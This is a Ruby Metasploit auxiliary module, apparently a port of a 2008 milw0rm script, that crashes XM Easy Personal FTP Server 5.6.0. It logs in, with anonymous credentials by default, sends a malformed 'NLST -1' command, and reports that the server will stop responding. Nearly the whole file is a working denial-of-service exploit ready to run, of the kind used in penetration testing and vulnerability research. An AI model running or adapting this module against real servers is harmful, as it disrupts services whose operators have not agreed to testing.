require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'XM Easy Personal FTP Server 5.6.0 NLST DoS',
			'Description'    => %q{
				This module is a port of shinnai's script.  You need
				a valid login, but even anonymous can do it as long
				as it has permission to call NLST.
			},
			'Author'         => 'kris',
			'License'        => MSF_LICENSE,
			'Version'        => '1',
			'References'     =>
				[ [ 'URL', 'http://milw0rm.com/exploits/6741'] ],
			'DisclosureDate' => 'Oct 13 2008'))

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		raw_send("NLST -1\r\n")

		disconnect

		print_status("OK, server may still be technically listening, but it won't respond")
	end
end
